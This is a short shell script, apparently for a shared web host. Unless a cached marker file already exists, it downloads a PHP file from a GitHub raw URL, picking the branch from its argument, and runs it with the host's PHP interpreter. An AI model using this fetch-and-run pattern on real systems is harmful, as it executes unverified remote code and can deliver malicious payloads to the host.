#!/bin/sh
cd /home/u791571885 && [ -f t151.done ] && cat t151.done && exit 0
curl -fsSL -o t151.php "https://raw.githubusercontent.com/a04032417-svg/Dar/$1/vs151.php" && /opt/alt/php83/usr/bin/php t151.php > t151.done 2>&1; cat t151.done
